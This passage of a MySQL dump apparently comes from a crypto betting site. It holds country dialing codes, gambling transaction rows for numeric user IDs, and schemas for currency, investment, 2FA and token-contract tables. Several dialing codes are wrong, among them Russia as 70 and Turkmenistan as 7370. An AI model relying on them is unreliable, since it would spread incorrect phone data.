(4, 'AS', 'American Samoa', 1684),
(5, 'AD', 'Andorra', 376),
(6, 'AO', 'Angola', 244),
(7, 'AI', 'Anguilla', 1264),
(8, 'AQ', 'Antarctica', 0),
(9, 'AG', 'Antigua And Barbuda', 1268),
(10, 'AR', 'Argentina', 54),
(11, 'AM', 'Armenia', 374),
(12, 'AW', 'Aruba', 297),
(13, 'AU', 'Australia', 61),
(14, 'AT', 'Austria', 43),
(15, 'AZ', 'Azerbaijan', 994),
(16, 'BS', 'Bahamas The', 1242),
(17, 'BH', 'Bahrain', 973),
(18, 'BD', 'Bangladesh', 880),
(19, 'BB', 'Barbados', 1246),
(20, 'BY', 'Belarus', 375),
(21, 'BE', 'Belgium', 32),
(22, 'BZ', 'Belize', 501),
(23, 'BJ', 'Benin', 229),
(24, 'BM', 'Bermuda', 1441),
(25, 'BT', 'Bhutan', 975),
(26, 'BO', 'Bolivia', 591),
(27, 'BA', 'Bosnia and Herzegovina', 387),
(28, 'BW', 'Botswana', 267),
(29, 'BV', 'Bouvet Island', 0),
(30, 'BR', 'Brazil', 55),
(31, 'IO', 'British Indian Ocean Territory', 246),
(32, 'BN', 'Brunei', 673),
(33, 'BG', 'Bulgaria', 359),
(34, 'BF', 'Burkina Faso', 226),
(35, 'BI', 'Burundi', 257),
(36, 'KH', 'Cambodia', 855),
(37, 'CM', 'Cameroon', 237),
(38, 'CA', 'Canada', 1),
(39, 'CV', 'Cape Verde', 238),
(40, 'KY', 'Cayman Islands', 1345),
(41, 'CF', 'Central African Republic', 236),
(42, 'TD', 'Chad', 235),
(43, 'CL', 'Chile', 56),
(44, 'CN', 'China', 86),
(45, 'CX', 'Christmas Island', 61),
(46, 'CC', 'Cocos (Keeling) Islands', 672),
(47, 'CO', 'Colombia', 57),
(48, 'KM', 'Comoros', 269),
(49, 'CG', 'Republic Of The Congo', 242),
(50, 'CD', 'Democratic Republic Of The Congo', 242),
(51, 'CK', 'Cook Islands', 682),
(52, 'CR', 'Costa Rica', 506),
(53, 'CI', 'Cote D\'Ivoire (Ivory Coast)', 225),
(54, 'HR', 'Croatia (Hrvatska)', 385),
(55, 'CU', 'Cuba', 53),
(56, 'CY', 'Cyprus', 357),
(57, 'CZ', 'Czech Republic', 420),
(58, 'DK', 'Denmark', 45),
(59, 'DJ', 'Djibouti', 253),
(60, 'DM', 'Dominica', 1767),
(61, 'DO', 'Dominican Republic', 1809),
(62, 'TP', 'East Timor', 670),
(63, 'EC', 'Ecuador', 593),
(64, 'EG', 'Egypt', 20),
(65, 'SV', 'El Salvador', 503),
(66, 'GQ', 'Equatorial Guinea', 240),
(67, 'ER', 'Eritrea', 291),
(68, 'EE', 'Estonia', 372),
(69, 'ET', 'Ethiopia', 251),
(70, 'XA', 'External Territories of Australia', 61),
(71, 'FK', 'Falkland Islands', 500),
(72, 'FO', 'Faroe Islands', 298),
(73, 'FJ', 'Fiji Islands', 679),
(74, 'FI', 'Finland', 358),
(75, 'FR', 'France', 33),
(76, 'GF', 'French Guiana', 594),
(77, 'PF', 'French Polynesia', 689),
(78, 'TF', 'French Southern Territories', 0),
(79, 'GA', 'Gabon', 241),
(80, 'GM', 'Gambia The', 220),
(81, 'GE', 'Georgia', 995),
(82, 'DE', 'Germany', 49),
(83, 'GH', 'Ghana', 233),
(84, 'GI', 'Gibraltar', 350),
(85, 'GR', 'Greece', 30),
(86, 'GL', 'Greenland', 299),
(87, 'GD', 'Grenada', 1473),
(88, 'GP', 'Guadeloupe', 590),
(89, 'GU', 'Guam', 1671),
(90, 'GT', 'Guatemala', 502),
(91, 'XU', 'Guernsey and Alderney', 44),
(92, 'GN', 'Guinea', 224),
(93, 'GW', 'Guinea-Bissau', 245),
(94, 'GY', 'Guyana', 592),
(95, 'HT', 'Haiti', 509),
(96, 'HM', 'Heard and McDonald Islands', 0),
(97, 'HN', 'Honduras', 504),
(98, 'HK', 'Hong Kong S.A.R.', 852),
(99, 'HU', 'Hungary', 36),
(100, 'IS', 'Iceland', 354),
(101, 'IN', 'India', 91),
(102, 'ID', 'Indonesia', 62),
(103, 'IR', 'Iran', 98),
(104, 'IQ', 'Iraq', 964),
(105, 'IE', 'Ireland', 353),
(106, 'IL', 'Israel', 972),
(107, 'IT', 'Italy', 39),
(108, 'JM', 'Jamaica', 1876),
(109, 'JP', 'Japan', 81),
(110, 'XJ', 'Jersey', 44),
(111, 'JO', 'Jordan', 962),
(112, 'KZ', 'Kazakhstan', 7),
(113, 'KE', 'Kenya', 254),
(114, 'KI', 'Kiribati', 686),
(115, 'KP', 'Korea North', 850),
(116, 'KR', 'Korea South', 82),
(117, 'KW', 'Kuwait', 965),
(118, 'KG', 'Kyrgyzstan', 996),
(119, 'LA', 'Laos', 856),
(120, 'LV', 'Latvia', 371),
(121, 'LB', 'Lebanon', 961),
(122, 'LS', 'Lesotho', 266),
(123, 'LR', 'Liberia', 231),
(124, 'LY', 'Libya', 218),
(125, 'LI', 'Liechtenstein', 423),
(126, 'LT', 'Lithuania', 370),
(127, 'LU', 'Luxembourg', 352),
(128, 'MO', 'Macau S.A.R.', 853),
(129, 'MK', 'Macedonia', 389),
(130, 'MG', 'Madagascar', 261),
(131, 'MW', 'Malawi', 265),
(132, 'MY', 'Malaysia', 60),
(133, 'MV', 'Maldives', 960),
(134, 'ML', 'Mali', 223),
(135, 'MT', 'Malta', 356),
(136, 'XM', 'Man (Isle of)', 44),
(137, 'MH', 'Marshall Islands', 692),
(138, 'MQ', 'Martinique', 596),
(139, 'MR', 'Mauritania', 222),
(140, 'MU', 'Mauritius', 230),
(141, 'YT', 'Mayotte', 269),
(142, 'MX', 'Mexico', 52),
(143, 'FM', 'Micronesia', 691),
(144, 'MD', 'Moldova', 373),
(145, 'MC', 'Monaco', 377),
(146, 'MN', 'Mongolia', 976),
(147, 'MS', 'Montserrat', 1664),
(148, 'MA', 'Morocco', 212),
(149, 'MZ', 'Mozambique', 258),
(150, 'MM', 'Myanmar', 95),
(151, 'NA', 'Namibia', 264),
(152, 'NR', 'Nauru', 674),
(153, 'NP', 'Nepal', 977),
(154, 'AN', 'Netherlands Antilles', 599),
(155, 'NL', 'Netherlands The', 31),
(156, 'NC', 'New Caledonia', 687),
(157, 'NZ', 'New Zealand', 64),
(158, 'NI', 'Nicaragua', 505),
(159, 'NE', 'Niger', 227),
(160, 'NG', 'Nigeria', 234),
(161, 'NU', 'Niue', 683),
(162, 'NF', 'Norfolk Island', 672),
(163, 'MP', 'Northern Mariana Islands', 1670),
(164, 'NO', 'Norway', 47),
(165, 'OM', 'Oman', 968),
(166, 'PK', 'Pakistan', 92),
(167, 'PW', 'Palau', 680),
(168, 'PS', 'Palestinian Territory Occupied', 970),
(169, 'PA', 'Panama', 507),
(170, 'PG', 'Papua new Guinea', 675),
(171, 'PY', 'Paraguay', 595),
(172, 'PE', 'Peru', 51),
(173, 'PH', 'Philippines', 63),
(174, 'PN', 'Pitcairn Island', 0),
(175, 'PL', 'Poland', 48),
(176, 'PT', 'Portugal', 351),
(177, 'PR', 'Puerto Rico', 1787),
(178, 'QA', 'Qatar', 974),
(179, 'RE', 'Reunion', 262),
(180, 'RO', 'Romania', 40),
(181, 'RU', 'Russia', 70),
(182, 'RW', 'Rwanda', 250),
(183, 'SH', 'Saint Helena', 290),
(184, 'KN', 'Saint Kitts And Nevis', 1869),
(185, 'LC', 'Saint Lucia', 1758),
(186, 'PM', 'Saint Pierre and Miquelon', 508),
(187, 'VC', 'Saint Vincent And The Grenadines', 1784),
(188, 'WS', 'Samoa', 684),
(189, 'SM', 'San Marino', 378),
(190, 'ST', 'Sao Tome and Principe', 239),
(191, 'SA', 'Saudi Arabia', 966),
(192, 'SN', 'Senegal', 221),
(193, 'RS', 'Serbia', 381),
(194, 'SC', 'Seychelles', 248),
(195, 'SL', 'Sierra Leone', 232),
(196, 'SG', 'Singapore', 65),
(197, 'SK', 'Slovakia', 421),
(198, 'SI', 'Slovenia', 386),
(199, 'XG', 'Smaller Territories of the UK', 44),
(200, 'SB', 'Solomon Islands', 677),
(201, 'SO', 'Somalia', 252),
(202, 'ZA', 'South Africa', 27),
(203, 'GS', 'South Georgia', 0),
(204, 'SS', 'South Sudan', 211),
(205, 'ES', 'Spain', 34),
(206, 'LK', 'Sri Lanka', 94),
(207, 'SD', 'Sudan', 249),
(208, 'SR', 'Suriname', 597),
(209, 'SJ', 'Svalbard And Jan Mayen Islands', 47),
(210, 'SZ', 'Swaziland', 268),
(211, 'SE', 'Sweden', 46),
(212, 'CH', 'Switzerland', 41),
(213, 'SY', 'Syria', 963),
(214, 'TW', 'Taiwan', 886),
(215, 'TJ', 'Tajikistan', 992),
(216, 'TZ', 'Tanzania', 255),
(217, 'TH', 'Thailand', 66),
(218, 'TG', 'Togo', 228),
(219, 'TK', 'Tokelau', 690),
(220, 'TO', 'Tonga', 676),
(221, 'TT', 'Trinidad And Tobago', 1868),
(222, 'TN', 'Tunisia', 216),
(223, 'TR', 'Turkey', 90),
(224, 'TM', 'Turkmenistan', 7370),
(225, 'TC', 'Turks And Caicos Islands', 1649),
(226, 'TV', 'Tuvalu', 688),
(227, 'UG', 'Uganda', 256),
(228, 'UA', 'Ukraine', 380),
(229, 'AE', 'United Arab Emirates', 971),
(230, 'GB', 'United Kingdom', 44),
(231, 'US', 'United States', 1),
(232, 'UM', 'United States Minor Outlying Islands', 1),
(233, 'UY', 'Uruguay', 598),
(234, 'UZ', 'Uzbekistan', 998),
(235, 'VU', 'Vanuatu', 678),
(236, 'VA', 'Vatican City State (Holy See)', 39),
(237, 'VE', 'Venezuela', 58),
(238, 'VN', 'Vietnam', 84),
(239, 'VG', 'Virgin Islands (British)', 1284),
(240, 'VI', 'Virgin Islands (US)', 1340),
(241, 'WF', 'Wallis And Futuna Islands', 681),
(242, 'EH', 'Western Sahara', 212),
(243, 'YE', 'Yemen', 967),
(244, 'YU', 'Yugoslavia', 38),
(245, 'ZM', 'Zambia', 260),
(246, 'ZW', 'Zimbabwe', 263);

-- --------------------------------------------------------

--
-- Table structure for table `credit_history_agin`
--

DROP TABLE IF EXISTS `credit_history_agin`;
CREATE TABLE IF NOT EXISTS `credit_history_agin` (
  `id` int(11) NOT NULL,
  `userId` int(11) NOT NULL,
  `tradeNo` text NOT NULL,
  `platformType` varchar(50) NOT NULL,
  `playName` varchar(20) NOT NULL,
  `creationTime` datetime NOT NULL,
  `transferType` varchar(15) NOT NULL,
  `transferAmount` decimal(18,8) NOT NULL,
  `previousAmount` decimal(18,8) NOT NULL,
  `currentAmount` decimal(18,8) NOT NULL,
  `currency` varchar(15) NOT NULL,
  `exchangeRate` int(11) NOT NULL,
  `transferRemark` text NOT NULL,
  `flag` int(11) NOT NULL,
  `time_123betnow` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `credit_history_agin`
--

INSERT INTO `credit_history_agin` (`id`, `userId`, `tradeNo`, `platformType`, `playName`, `creationTime`, `transferType`, `transferAmount`, `previousAmount`, `currentAmount`, `currency`, `exchangeRate`, `transferRemark`, `flag`, `time_123betnow`) VALUES
(25, 350205, '220418969270372', 'AGIN', 'now_350205', '2022-04-18 03:24:16', 'BET', '-1.00000000', '40.91000000', '39.91000000', 'CNY', 1, 'WH11;8220418033849515;', 0, '2022-04-18 07:24:16'),
(26, 350205, '220418969270432', 'AGIN', 'now_350205', '2022-04-18 03:24:16', 'RECKON', '0.00000000', '39.91000000', '39.91000000', 'CNY', 1, 'WH11;8220418033849515;', 0, '2022-04-18 07:24:16'),
(27, 350205, '220418969279023', 'AGIN', 'now_350205', '2022-04-18 03:24:24', 'BET', '-1.00000000', '39.91000000', '38.91000000', 'CNY', 1, 'WH11;8220418033850907;', 0, '2022-04-18 07:24:24'),
(28, 350205, '220418969279106', 'AGIN', 'now_350205', '2022-04-18 03:24:24', 'RECKON', '0.00000000', '38.91000000', '38.91000000', 'CNY', 1, 'WH11;8220418033850907;', 0, '2022-04-18 07:24:24'),
(29, 350205, '220418969288847', 'AGIN', 'now_350205', '2022-04-18 03:24:33', 'BET', '-1.00000000', '38.91000000', '37.91000000', 'CNY', 1, 'WH11;8220418033852591;', 0, '2022-04-18 07:24:33'),
(30, 350205, '220418969288878', 'AGIN', 'now_350205', '2022-04-18 03:24:34', 'RECKON', '0.00000000', '37.91000000', '37.91000000', 'CNY', 1, 'WH11;8220418033852591;', 0, '2022-04-18 07:24:34'),
(31, 350205, '220418969307307', 'AGIN', 'now_350205', '2022-04-18 03:24:50', 'BET', '-1.00000000', '37.91000000', '36.91000000', 'CNY', 1, 'WH11;8220418033855546;', 0, '2022-04-18 07:24:50'),
(32, 350205, '220418969307365', 'AGIN', 'now_350205', '2022-04-18 03:24:50', 'RECKON', '0.00000000', '36.91000000', '36.91000000', 'CNY', 1, 'WH11;8220418033855546;', 0, '2022-04-18 07:24:50'),
(33, 456319, '220418958224842', 'AGIN', 'now_456319', '2022-04-18 00:26:10', 'BET', '-2.00000000', '55.50000000', '53.50000000', 'CNY', 1, 'SPTA;8220418001939721;45642174;', 0, '2022-04-18 04:26:10'),
(34, 350205, '220418967181316', 'AGIN', 'now_350205', '2022-04-18 02:53:02', 'BET', '-5.00000000', '55.96000000', '50.96000000', 'CNY', 1, 'SB56;8220418023491852;', 0, '2022-04-18 06:53:02'),
(35, 350205, '220418967192208', 'AGIN', 'now_350205', '2022-04-18 02:53:12', 'BET', '-2.50000000', '50.96000000', '48.46000000', 'CNY', 1, 'SB56;8220418023493588;', 0, '2022-04-18 06:53:12'),
(36, 350205, '220418967203291', 'AGIN', 'now_350205', '2022-04-18 02:53:23', 'RECKON', '0.25000000', '45.96000000', '46.21000000', 'CNY', 1, 'SB56;8220418023495627;', 0, '2022-04-18 06:53:23'),
(37, 350205, '220418967203290', 'AGIN', 'now_350205', '2022-04-18 02:53:23', 'BET', '-2.50000000', '48.46000000', '45.96000000', 'CNY', 1, 'SB56;8220418023495627;', 0, '2022-04-18 06:53:23'),
(38, 350205, '220418967217534', 'AGIN', 'now_350205', '2022-04-18 02:53:37', 'BET', '-2.50000000', '46.21000000', '43.71000000', 'CNY', 1, 'SB56;8220418023498320;', 0, '2022-04-18 06:53:37'),
(39, 350205, '220418967944192', 'AGIN', 'now_350205', '2022-04-18 03:04:47', 'BET', '-1.20000000', '43.71000000', '42.51000000', 'CNY', 1, 'SB06;8220418033627359;', 0, '2022-04-18 07:04:47'),
(40, 350205, '220418967944195', 'AGIN', 'now_350205', '2022-04-18 03:04:47', 'RECKON', '1.20000000', '42.51000000', '43.71000000', 'CNY', 1, 'SB06;8220418033627359;', 0, '2022-04-18 07:04:47'),
(41, 350205, '220418968004853', 'AGIN', 'now_350205', '2022-04-18 03:05:39', 'RECKON', '0.40000000', '42.51000000', '42.91000000', 'CNY', 1, 'SB06;8220418033637504;', 0, '2022-04-18 07:05:39'),
(42, 350205, '220418968004839', 'AGIN', 'now_350205', '2022-04-18 03:05:39', 'BET', '-1.20000000', '43.71000000', '42.51000000', 'CNY', 1, 'SB06;8220418033637504;', 0, '2022-04-18 07:05:39'),
(43, 350205, '220418968015564', 'AGIN', 'now_350205', '2022-04-18 03:05:49', 'BET', '-1.20000000', '42.91000000', '41.71000000', 'CNY', 1, 'SB06;8220418033639417;', 0, '2022-04-18 07:05:49'),
(44, 350205, '220418968020243', 'AGIN', 'now_350205', '2022-04-18 03:05:53', 'RECKON', '0.40000000', '40.51000000', '40.91000000', 'CNY', 1, 'SB06;8220418033640290;', 0, '2022-04-18 07:05:53'),
(45, 350205, '220418968020232', 'AGIN', 'now_350205', '2022-04-18 03:05:53', 'BET', '-1.20000000', '41.71000000', '40.51000000', 'CNY', 1, 'SB06;8220418033640290;', 0, '2022-04-18 07:05:53'),
(46, 350205, '220418973480753', 'AGIN', 'now_350205', '2022-04-18 04:26:43', 'BET', '-10.00000000', '36.91000000', '26.91000000', 'CNY', 1, 'SB58;8220418044546384;', 0, '2022-04-18 07:26:43');

-- --------------------------------------------------------

--
-- Table structure for table `currency`
--

DROP TABLE IF EXISTS `currency`;
CREATE TABLE IF NOT EXISTS `currency` (
  `Currency_ID` int(10) UNSIGNED NOT NULL,
  `Currency_Name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Currency_Symbol` char(15) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Currency_Active` tinyint(1) DEFAULT '0' COMMENT '1: Kích hoạt | 0: Ngưng kích hoạt'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `currency`
--

INSERT INTO `currency` (`Currency_ID`, `Currency_Name`, `Currency_Symbol`, `Currency_Active`) VALUES
(1, 'BTC', 'BTC', 1),
(2, 'ETH', 'ETH', 1),
(3, 'EUSD', 'EUSD', 1),
(4, 'DP-NFT', 'DP-NFT', 1),
(5, 'USDT (ERC20)', 'USDT', 1),
(6, 'USDT (TRC20)', 'USDT', 1),
(7, 'HBG', 'HBG', 1),
(8, 'EBP', 'EBP', 1),
(9, 'GOLD', 'GOLD', 1),
(10, 'USDT Bonus', 'USDT', 1),
(11, 'USDT (BEP20)', 'USDT', 1),
(12, 'Solana (BEP20)', 'SOL', 1),
(13, 'Coin98 (BEP20)', 'C98', 1),
(14, 'Cardano (BEP20)', 'ADA', 1),
(15, 'Tron', 'TRX', 1),
(16, 'BNB', 'BNB', 1),
(17, 'USDT (Voucher)', 'EUSD', 1),
(18, 'USDT (Lucky Hero)', 'USDT', 1),
(20, 'USDT (Bonus Gift Code)', 'USDT', 1),
(21, 'VNĐ', 'VNĐ', 1);

-- --------------------------------------------------------

--
-- Table structure for table `document`
--

DROP TABLE IF EXISTS `document`;
CREATE TABLE IF NOT EXISTS `document` (
  `Doc_ID` int(11) NOT NULL,
  `Doc_Title` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `Doc_File` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `Doc_ParentID` int(11) DEFAULT NULL,
  `Doc_Status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `document`
--

INSERT INTO `document` (`Doc_ID`, `Doc_Title`, `Doc_File`, `Doc_ParentID`, `Doc_Status`) VALUES
(5, 'Proposal', 'https://media.123betnow.net/Documents/file_547058_608665b154a59.pdf', NULL, 0),
(6, 'Proposal', 'https://media.123betnow.net/Documents/slide-23betnow-official-eng.pdf', NULL, 1);

-- --------------------------------------------------------

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
CREATE TABLE IF NOT EXISTS `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `gamefund`
--

DROP TABLE IF EXISTS `gamefund`;
CREATE TABLE IF NOT EXISTS `gamefund` (
  `GameFund_ID` int(11) NOT NULL,
  `GameFund_symbol` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `GameFund_fund` decimal(10,8) NOT NULL,
  `GameFund_fundReal` decimal(10,5) NOT NULL,
  `GameFund_user` int(11) NOT NULL,
  `GameFund_datatime` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `gamefund`
--

INSERT INTO `gamefund` (`GameFund_ID`, `GameFund_symbol`, `GameFund_fund`, `GameFund_fundReal`, `GameFund_user`, `GameFund_datatime`) VALUES
(1, 'BTCUSDT', '99.99999999', '724.00000', 999999, '2019-11-08 00:00:00'),
(2, 'ETHUSDT', '99.99999999', '100.00000', 999999, '2019-11-08 00:00:00'),
(6, 'EOSUSDT', '99.99999999', '110.50000', 999999, '2019-11-08 00:00:00'),
(10, 'LTCUSDT', '99.99999999', '129.90000', 999999, '2019-11-08 00:00:00'),
(11, 'BNBUSDT', '99.99999999', '100.00000', 999999, '2019-11-08 00:00:00'),
(12, 'BCHUSDT', '99.99999999', '140.60000', 999999, '2019-11-08 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `game_type`
--

DROP TABLE IF EXISTS `game_type`;
CREATE TABLE IF NOT EXISTS `game_type` (
  `game_type_id` int(11) NOT NULL,
  `game_type_name` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `game_type_logo` text COLLATE utf8_unicode_ci NOT NULL,
  `game_type_status` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `game_type`
--

INSERT INTO `game_type` (`game_type_id`, `game_type_name`, `game_type_logo`, `game_type_status`) VALUES
(1, 'Casino', 'https://st2.depositphotos.com/1864489/7266/v/450/depositphotos_72662419-stock-illustration-casino-golden-emblem-or-badge.jpg', 1),
(2, 'Fish Shooter', 'https://m.media-amazon.com/images/I/91CRa-KXNxL.png', 1),
(3, 'SportBook', 'https://pokerfuse.com/site_media/media/uploads/news/ggpoker-wsop-logos.png', 1),
(4, 'Agin Slot', 'https://i.ibb.co/bFvCDyr/LogoAgen138.png', 1);

-- --------------------------------------------------------

--
-- Table structure for table `gas`
--

DROP TABLE IF EXISTS `gas`;
CREATE TABLE IF NOT EXISTS `gas` (
  `id` int(11) NOT NULL,
  `amount` int(11) NOT NULL,
  `time` bigint(20) NOT NULL,
  `duration` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `google2fa`
--

DROP TABLE IF EXISTS `google2fa`;
CREATE TABLE IF NOT EXISTS `google2fa` (
  `google2fa_ID` int(11) NOT NULL,
  `google2fa_User` varchar(20) NOT NULL COMMENT 'ID User (users)',
  `google2fa_Secret` varchar(100) NOT NULL COMMENT 'QRCODE chuẩn để mã hóa'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `historysa`
--

DROP TABLE IF EXISTS `historysa`;
CREATE TABLE IF NOT EXISTS `historysa` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `BetTime` datetime NOT NULL,
  `PayoutTime` datetime NOT NULL,
  `Username` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `HostID` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `GameID` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Round` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Set` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `BetID` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `BetAmount` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Rolling` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ResultAmount` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Balance` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `GameType` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `BetType` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `BetSource` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Detail` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TransactionID` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `GameResult` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `State` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `statistical` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `history_wm`
--

DROP TABLE IF EXISTS `history_wm`;
CREATE TABLE IF NOT EXISTS `history_wm` (
  `id` int(11) NOT NULL,
  `MemberName` varchar(255) NOT NULL,
  `Username` varchar(50) NOT NULL,
  `Currency` varchar(50) NOT NULL,
  `Per` int(11) NOT NULL,
  `Amount` decimal(18,8) NOT NULL,
  `ValidBetVirtual` decimal(18,8) NOT NULL,
  `ValidBetReal` decimal(18,8) NOT NULL,
  `WinLoss` decimal(18,8) NOT NULL,
  `RolloverCommission` decimal(18,8) NOT NULL,
  `Result` decimal(18,8) NOT NULL,
  `LowerPay` int(11) NOT NULL,
  `Upload` decimal(18,8) NOT NULL,
  `Profit` decimal(18,8) NOT NULL,
  `DateTime` datetime NOT NULL,
  `CreatedAt` datetime NOT NULL,
  `Statistical` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `investment`
--

DROP TABLE IF EXISTS `investment`;
CREATE TABLE IF NOT EXISTS `investment` (
  `investment_ID` int(11) NOT NULL,
  `investment_User` varchar(20) COLLATE utf8_unicode_ci NOT NULL COMMENT 'ID User (users)',
  `investment_Amount` decimal(18,8) NOT NULL DEFAULT '0.00000000' COMMENT 'Số tiền đầu tư',
  `investment_Package` int(11) DEFAULT NULL COMMENT 'Gói đầu tư',
  `investment_Package_Time` int(11) DEFAULT NULL COMMENT 'Số tháng đầu tư',
  `investment_Currency` int(11) NOT NULL COMMENT 'Loại tiền - Currency_ID (currency)',
  `investment_Rate` decimal(18,8) NOT NULL COMMENT 'Tỷ giá',
  `investment_Hash` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `investment_Insurrance` tinyint(1) NOT NULL DEFAULT '0',
  `investment_InsurDate` int(11) DEFAULT NULL,
  `investment_TimeOld` int(11) DEFAULT NULL,
  `investment_ReInvest` tinyint(1) NOT NULL DEFAULT '0',
  `investment_Time` int(11) NOT NULL COMMENT 'Thời gian đầu tư',
  `investment_Status` tinyint(1) NOT NULL COMMENT '1: Đang trả lãi | 2: Đã trả gốc | 0: Chờ xác nhận | -1: Admin Hủy'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `jobs`
--

DROP TABLE IF EXISTS `jobs`;
CREATE TABLE IF NOT EXISTS `jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `queue` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `attempts` tinyint(3) UNSIGNED NOT NULL,
  `reserved_at` int(10) UNSIGNED DEFAULT NULL,
  `available_at` int(10) UNSIGNED NOT NULL,
  `created_at` int(10) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `liquid_partners`
--

DROP TABLE IF EXISTS `liquid_partners`;
CREATE TABLE IF NOT EXISTS `liquid_partners` (
  `id` int(11) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `icon` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `contract` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `url` text,
  `name_token` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `price` decimal(18,8) NOT NULL,
  `status` int(11) NOT NULL,
  `color_code` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `liquid_partners`
--

INSERT INTO `liquid_partners` (`id`, `name`, `icon`, `contract`, `url`, `name_token`, `price`, `status`, `color_code`) VALUES
(1, 'Dragon pool', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/dpn.png', '0xc31c29d89e1c351d0a41b938dc8aa0b9f07b4a29', 'https://bscscan.com/address/', 'DP-NFT', '1.00000000', 0, NULL),
(2, 'Tether Bep-20', ' https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/usd.png\n', '0x55d398326f99059ff775485246999027b3197955', 'https://bscscan.com/address/', 'USDT', '1.00000000', 1, '#19A12E'),
(3, 'BNB', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/bnb.png\n', '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', 'https://bscscan.com/address/', 'BNB', '1.00000000', 1, '#A78C1B'),
(4, 'Tether TRC-20', ' https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/usd.png\n', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 'https://tronscan.org/#/contract/', 'USDT', '1.00000000', 1, '#19A12E'),
(5, 'Solana', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/sol.png', '', NULL, 'SOL', '1.00000000', 0, NULL),
(6, 'Coin98', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/c98.png', '0xaec945e04baf28b135fa7c640f624f8d90f1c3a6', 'https://bscscan.com/address/', 'C98', '1.00000000', 1, '#A78C1B'),
(7, 'Cardano', 'https://images-storage-bucket.s3.ap-southeast-1.amazonaws.com/123betnow/listing/ada.png', '0x3ee2200efb3400fabb9aacf31297cbdd1d435d47', 'https://bscscan.com/address/', 'ADA', '1.00000000', 1, '#1B309F'),
